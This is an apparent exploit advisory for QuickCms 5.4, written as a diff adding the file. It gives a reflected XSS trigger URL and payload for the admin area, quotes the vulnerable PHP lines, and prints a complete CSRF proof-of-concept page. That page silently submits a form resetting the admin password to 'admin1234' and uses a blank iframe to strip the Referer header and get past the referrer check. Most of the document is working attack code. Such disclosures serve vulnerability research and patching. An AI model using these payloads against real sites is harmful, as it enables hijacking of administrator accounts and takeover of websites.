@@ -1,0 +1,58 @@
+# Exploit Title: QuickCms 5.4 Multiple Vulnerabilites
+# Date: 04/08/2014
+# Author: shpendk
+# Software Link: http://opensolution.org/download,en,18.html?sFile=Quick.Cms/Quick.Cms_v5.4.zip
+# Version: 5.4
+# Tested on: Xampp on Windows
+
+
+
+Reflected XSS Vulnerability in Admin Area:
+
+Trigger: http://localhost/quickcms/admin.php/123';alert(123);//abc?p=pages-form&iPage=14
+
+
+Vulnerable code: in /quickcms/templates/admin/pages-form.php:
+
+144:			 <script type="text/javascript">
+145:                   var sPhpSelf = '<?php echo $_SERVER['PHP_SELF']; ?>';...
+
+poc: anything';alert(123);//
+
+
+
+
+Admin password change csrf:
+
+<html>
+<head>
+<script>
+function load() {
+    var postdata = '<form id=dynForm method=POST action=\'http://localhost/admin.php?p=tools-config\'>' +
+                    '<input type=hidden name=sOption value=save login=admin />' +
+                    '<input type=hidden name=pass value=admin1234 />' +
+                    '</form>';
+    top.frames[0].document.body.innerHTML=postdata;
+    top.frames[0].document.getElementById('dynForm').submit();
+}
+</script>
+</head>
+<body onload="load()">
+
+<iframe src="about:blank" id="noreferer"></iframe>
+
+
+</body>
+</html>
+
+
+Vulnerable code:
+60:	if( ( strstr( $p, '-delete' ) || count( $_POST ) > 0 ) && !empty( $_SERVER['HTTP_REFERER'] ) && !strstr( $_SERVER['HTTP_REFERER'], $_SERVER['SCRIPT_NAME'] ) ){
+61:  header( 'Location: '.$_SERVER['PHP_SELF'].'?p=error' );
+62:  exit;
+}
+
+Explanation:
+
+The above code checks for the presence for a referer header, if there is no referer present the POST works fine. This is trivially bypassed using information from here:
+http://webstersprodigy.net/2013/02/01/stripping-the-referer-in-a-cross-domain-post-request/
